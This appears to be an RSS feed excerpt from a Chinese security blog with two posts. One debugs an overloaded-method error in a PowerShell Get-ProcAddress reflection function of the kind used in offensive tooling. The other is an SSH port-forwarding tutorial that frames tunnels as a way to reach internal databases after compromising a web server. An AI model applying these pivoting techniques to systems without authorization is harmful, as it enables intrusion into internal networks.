&lt;p>报错的第886行代码为&lt;code>$GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress')&lt;/code>,它存在如下函数中：&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">Function&lt;/span> Get-ProcAddress
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">Param&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> (
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [OutputType([&lt;span style="color:#66d9ef">IntPtr&lt;/span>])]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [Parameter( &lt;span style="color:#a6e22e">Position&lt;/span> = &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">Mandatory&lt;/span> = $True )]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#66d9ef">String&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $Module,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [Parameter( &lt;span style="color:#a6e22e">Position&lt;/span> = &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#a6e22e">Mandatory&lt;/span> = $True )]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> [&lt;span style="color:#66d9ef">String&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $Procedure
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Get a reference to System.dll in the GAC&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $SystemAssembly = [&lt;span style="color:#66d9ef">AppDomain&lt;/span>]::CurrentDomain.GetAssemblies() |
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Where-Object { $_.GlobalAssemblyCache &lt;span style="color:#f92672">-And&lt;/span> $_.Location.Split(&lt;span style="color:#e6db74">&amp;#39;\\&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">-1&lt;/span>].Equals(&lt;span style="color:#e6db74">&amp;#39;System.dll&amp;#39;&lt;/span>) }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $UnsafeNativeMethods = $SystemAssembly.GetType(&lt;span style="color:#e6db74">&amp;#39;Microsoft.Win32.UnsafeNativeMethods&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Get a reference to the GetModuleHandle and GetProcAddress methods&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $GetModuleHandle = $UnsafeNativeMethods.GetMethod(&lt;span style="color:#e6db74">&amp;#39;GetModuleHandle&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $GetProcAddress = $UnsafeNativeMethods.GetMethod(&lt;span style="color:#e6db74">&amp;#39;GetProcAddress&amp;#39;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># $GetProcAddress = $UnsafeNativeMethods.GetMethod(&amp;#39;GetProcAddress&amp;#39;, [reflection.bindingflags] &amp;#34;Public,Static&amp;#34;, $null, [System.Reflection.CallingConventions]::Any, @((New-Object System.Runtime.InteropServices.HandleRef).GetType(), [string]), $null);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Get a handle to the module specified&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $tmpPtr = New-Object IntPtr
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Return the address of the function&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Output $GetProcAddress.Invoke($null, @([&lt;span style="color:#66d9ef">System.Runtime.InteropServices.HandleRef&lt;/span>]$HandleRef, $Procedure))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>该行代码由于在执行$UnsafeNativeMethods.GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)的时候，$UnsafeNativeMethods有两个方法名都是GetProcAddress，显然是方法的重载，所以GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)无法确定返回哪个方法，所以出现错误。powershell和其他shell一样，代码执行出错抛出异常后会继续执行后面的代码。它不像python、php这些脚本语言，抛出异常后会终止程序。所以后面的报错是因为第一个错误产生的。&lt;/p>
&lt;p>以下是$UnsafeNativeMethods.GetMethod(&amp;lsquo;GetProcAddress&amp;rsquo;)的两个可能的值，必须想办法让它确定下来，方法之一则是“暂时解决办法”提到的那样。&lt;/p>
&lt;pre tabindex="0">&lt;code>Name : GetProcAddress
DeclaringType : Microsoft.Win32.UnsafeNativeMethods
ReflectedType : Microsoft.Win32.UnsafeNativeMethods
MemberType : Method
MetadataToken : 100663839
Module : System.dll
IsSecurityCritical : True
IsSecuritySafeCritical : True
IsSecurityTransparent : False
MethodHandle : System.RuntimeMethodHandle
Attributes : PrivateScope, Public, Static, HideBySig, PinvokeImpl
CallingConvention : Standard
ReturnType : System.IntPtr
ReturnTypeCustomAttributes : IntPtr
ReturnParameter : IntPtr
IsGenericMethod : False
IsGenericMethodDefinition : False
ContainsGenericParameters : False
MethodImplementationFlags : PreserveSig
IsPublic : True
IsPrivate : False
IsFamily : False
IsAssembly : False
IsFamilyAndAssembly : False
IsFamilyOrAssembly : False
IsStatic : True
IsFinal : False
IsVirtual : False
IsHideBySig : True
IsAbstract : False
IsSpecialName : False
IsConstructor : False
CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetProcAddress&amp;#34;, CharSet = 2, ExactSpelling = True, SetLastError = True, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
Name : GetProcAddress
DeclaringType : Microsoft.Win32.UnsafeNativeMethods
ReflectedType : Microsoft.Win32.UnsafeNativeMethods
MemberType : Method
MetadataToken : 100663864
Module : System.dll
IsSecurityCritical : True
IsSecuritySafeCritical : True
IsSecurityTransparent : False
MethodHandle : System.RuntimeMethodHandle
Attributes : PrivateScope, Public, Static, HideBySig, PinvokeImpl
CallingConvention : Standard
ReturnType : System.IntPtr
ReturnTypeCustomAttributes : IntPtr
ReturnParameter : IntPtr
IsGenericMethod : False
IsGenericMethodDefinition : False
ContainsGenericParameters : False
MethodImplementationFlags : PreserveSig
IsPublic : True
IsPrivate : False
IsFamily : False
IsAssembly : False
IsFamilyAndAssembly : False
IsFamilyOrAssembly : False
IsStatic : True
IsFinal : False
IsVirtual : False
IsHideBySig : True
IsAbstract : False
IsSpecialName : False
IsConstructor : False
CustomAttributes : {[System.Runtime.InteropServices.DllImportAttribute(&amp;#34;kernel32.dll&amp;#34;, EntryPoint = &amp;#34;GetProcAddress&amp;#34;, CharSet = 2, ExactSpelling = False, SetLastError = False, PreserveSig = True, CallingConvention = 1, BestFitMapping = False, ThrowOnUnmappableChar = False)], [System.Runtime.InteropServices.PreserveSigAttribute()]}
&lt;/code>&lt;/pre></description></item><item><title>SSH隧道转发</title><link>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</link><pubDate>Sun, 15 Jul 2018 14:30:00 +0800</pubDate><guid>https://runshell.github.io/post/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/ssh%E9%9A%A7%E9%81%93%E8%BD%AC%E5%8F%91/</guid><description>&lt;img src="https://runshell.github.io/images/1536460373438.png" alt="Featured image of post SSH隧道转发" />&lt;h2 id="0x00-ssh常用参数说明">0x00 ssh常用参数说明
&lt;/h2>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>-C 压缩传输数据,加快传输速度
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-f 后台对用户名密码进行认证
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-N 仅仅只用来转发,不用再弹回一个新的shell
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-n 后台运行
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-q 安静模式,不要显示警告等信息
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-l 指定ssh登录名
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-g 允许远程主机连接到本地转发的端口（本机监听地址设为0.0.0.0，不选则为127.0.0.1）
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-L 进行本地端口转发
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-R 进行远程端口转发
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-D 动态转发,即socks代理
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-T 禁止分配伪终端
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>-p 指定远程ssh服务端口
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x01-本地转发">0x01 本地转发
&lt;/h2>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh &lt;span style="color:#f92672">[&lt;/span>-C&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>-f&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>-N&lt;span style="color:#f92672">]&lt;/span> &lt;span style="color:#f92672">[&lt;/span>-g&lt;span style="color:#f92672">]&lt;/span> -L &lt;span style="color:#f92672">[&lt;/span>本机ip&lt;span style="color:#f92672">]&lt;/span>:本机端口:vps能访问的主机ip:端口 &amp;lt;user@vps&amp;gt;
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将本地的一个端口映射到vps能到达的主机的一个端口。如果vps是边界设备，拥有多网卡，那么就可以用该方法访问内网主机的服务。&lt;/p>
&lt;blockquote>
&lt;p>例：假如你拥有一台web服务器的控制权，但是数据库服务器没有公网IP，你想直接访问数据库的服务，这时就可以使用本地转发，在本地（local）执行如下命令：&lt;/p>&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -Nnf -L 6666:10.10.10.12:3306 root@188.224.123.45
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#访问本地的6666端口就可以被映射到数据库10.10.10.12的3306端口&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mysql -u root -ppassword -P &lt;span style="color:#ae81ff">6666&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>序列图如下：&lt;/p>
&lt;p>&lt;img src="https://runshell.github.io/images/1536460373438.png"
loading="lazy"
alt="1536460373438"
>&lt;/p>
&lt;h2 id="0x02-远程转发">0x02 远程转发
&lt;/h2>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -C -f -N -R 0.0.0.0:vps_port:本机能访问的IP:端口 root@vps
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将vps上的一个端口映射到本机能到达的主机的一个端口。以至于可以通过vps访问内网的计算机上面的服务。遗憾的是，即使你指定了监听地址为0.0.0.0，它也仅能监听127.0.0.1，不能实现内网穿透。&lt;/p>
&lt;p>然后经过一番折腾，得出答案，需要修改sshd的配置文件&lt;code>/etc/ssh/sshd_config&lt;/code>,将配置做如下修改：&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-config" data-lang="config">GatewayPorts yes
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#重启sshd服务&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>service sshd restart &lt;span style="color:#f92672">||&lt;/span> systemctl restart sshd
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="0x03-动态转发">0x03 动态转发
&lt;/h2>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ssh -qTfnN -D 0.0.0.0:1080 root@vps -p &lt;span style="color:#ae81ff">22&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>本机将本地1080端口的所有流量发给vps，vps转发收到的流量。这就是赤裸裸的socks代理啊。&lt;/p></description></item></channel></rss>